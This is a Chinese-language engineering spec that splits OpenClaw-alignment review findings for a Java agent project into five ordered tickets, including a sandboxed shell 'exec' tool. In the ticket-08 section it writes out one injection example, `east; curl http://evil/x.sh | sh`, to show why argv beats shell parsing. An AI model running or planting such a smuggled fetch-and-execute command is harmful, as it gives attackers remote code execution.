# OpenClaw 对齐：从「故意不同」里清出来的五处

## 这份 spec 是什么

2026-11-07 的全量票面评审（`docs/reviews/2026-11-07-m0-m8-openclaw-alignment.md`）里，
batch B 有四处被记成**故意不同**——"和 OpenClaw 不一样，但我们写了理由"：

| 票 | 差异 |
| --- | --- |
| m2-02 | MCP 启动即 fail-fast vs 后台退避重试 |
| m2-08 | argv 直执 vs shell 解释 |
| m2-closeout-04 | 进程内 TTL 去重 vs 持久队列 |
| m2-closeout-05 | 连不上即启动失败 vs 降级 |

batch C 里还有两处（`m3-03`、`m5-02`），重判的结论见 `.scratch/review-2026-11-07/batch-c.md`：
`m3-03` 也是真偏差（`05`），`m5-02` 是票面被推翻（已过期，只剩一句指针，不单独开票）。

按 `AGENTS.md` 的口径重判过一轮之后，"故意不同"这一档不再装东西：

> 和它不一样就是偏差（不一致）；它没有这个东西就是自研——那要用例子说清，
> 不能反过来拿"我们有理由"当结论。

于是这批里，四条是**真偏差**（02 / closeout-04 / closeout-05 / m3-03），
一条是**能力缺口**（08 顺带暴露出来的：我们没有通用 shell，而它有 `exec`）。
这份 spec 把它们拆成五张票，`issues/01`–`05`。

## 08 与 01 的关系（这里改过一次）

08 的结论——"我们的**脚本包**收 argv，不收命令字符串"——仍然成立，那是形态选择：
`east; curl http://evil/x.sh | sh` 走 shell 是两条命令，走 argv 是一个参数。脚本包不动。

但 08 的复核顺带暴露了两件事，第一版把它们的因果弄反了：

1. 通用 shell 工具（`ShellTools`）就在 classpath 上，只是没装；
2. 装它不需要碰任何一道闸（不 `new ProcessBuilder`、不写 `sh -c` 字面量）。

第一版的票写成"那就永远不许装"，`because` 是"通用 shell 把模型的一句话变成一段脚本"——
**这个命题是错的**：通用 shell 是大模型的正经需求，OpenClaw 的 `exec` 就是它，还被做得很正式
（参数、白名单、权限模式、审批、内存与 I/O 预算，见票 `01` 里抄的原文）。
错的是"**裸装**"——没有沙箱、没有环境白名单、没有审批地挂上去。所以 01 现在是
"**照它的形态把 exec 补上**，顺手把红线改成'只许经由我们的沙箱入口'"，不是禁令。

## 五张票与顺序

| 票 | 内容 | 代价 | 判据来源 |
| --- | --- | --- | --- |
| `02-channel-recoverable-reconnect` | 通道：可恢复失败走后台重连，永久错误仍失败 | 小偏中 | `docs/channels/slack/transports.md:71` |
| `05-session-visibility` | 会话可见性：`self` 是它四值里的一档，默认 `all` | 小偏中（要一条跨会话查询） | `docs/gateway/config-tools/sessions-and-subagents.md`（`tools.sessions`） |
| `01-exec-tool` | 通用 shell：照 `exec` 的形态补，走沙箱 / 白名单 / 审批 | 中（要改一条红线） | `docs/tools/exec.md`、`permission-modes.md`、`exec-approvals.md` |
| `03-mcp-background-retry` | MCP：连不上后台退避重试，工具清单按轮解析 | 中偏大 | `docs/tools/mcp.md:44-45,61` |
| `04-inbound-durable-queue` | 入站：先落库再 ACK，重启续跑，同对话串行 | 大 | `docs/channels/feishu/setup.md:43,45` |

顺序不是"由易到难"凑出来的，是**依赖决定的**：

- `02` 先做：它是"可注入端口 + 可控调度器 + 状态"这套形状的**最小样本**——飞书通道今天直接
  `new Client.Builder(...)`，默认构建里既没有凭据也没有网络，于是"重连"根本写不出用例。
  先在通道上跑通这套形状，`03` 照它做，比在 MCP 那一层边设计边试便宜。
- `05` 只碰 `claw4j-agent` 一个模块，与谁都不冲突；**但它有一条不属于工程判断的取舍**
  （默认 `all` = 默认跨用户可召回），所以位置取决于什么时候愿意处理这件事。
- `01` 排在中间而不是最前，就一个原因：**它要改一条红线**（`BuildContractTest` 的两条规则要放行
  第二个点名类）。红线类的改动一次只做一件，不要和 `03`/`04` 的改动叠在同一个窗口里评审。
- `03` 依赖 `02` 的形状；`04` 最后，因为它要动数据库（新 schema + 迁移 + 真库用例），
  还会改掉 `accept` 的语义。前四张都不碰库，先做完它们，`04` 的红只可能出在它自己身上。

## 共同的判据口径

- **反例必须先跑红**。五张票的验收都写了两类：正例（该绿的绿）+ 反例（把实现改坏这条必须红）。
  没有跑过反例等于没有验证。
- **证据落到方法名**，不只写 Comments。
- **门禁**：`./scripts/verify.sh` 全绿、跳过 0、行覆盖率 ≥60%；每模块 ≤10 个测试文件、
  单文件 ≤20 个 `@Test`。**五个模块现在都正好 10 个文件**，所以五张票都不能新开测试文件，
  只能塞进未满的既有文件或先合并腾槽。这条每张票都单独写了落点。
- **对齐的是机制，不是措辞**。理由三段（它那条机制是什么 → 我们差在哪 → 只能改成什么、代价是什么）
  缺第三段的不算理由，算另发明一套。

## 不做

- **不改 ADR 正文**。`01` 与 `03` 都要动 ADR-0002（一个是红线、一个是"启动期硬失败"），
  做法是加修订记录（那篇已有先例），不是重写当年那段推理。
- **不做 `exec` 的后台形态**（`yieldMs` 转后台、`process` 工具、PTY、durable execution、`host=node`）。
  理由与重开条件写在票 `01` 的偏离 2：我们没有它那种 gateway 进程模型，留下的后台进程没有任何人能读到输出。
- **不引 Redis / 不引消息队列**。`04` 用库里的一张表，理由写在票面（我们只有一个进程要活过重启，
  不是要一个跨进程总线）。
- **不接 CI、不用假模型**。这两条已经裁决过，五张票都按"本地手动跑 `./mvnw clean verify`"写。
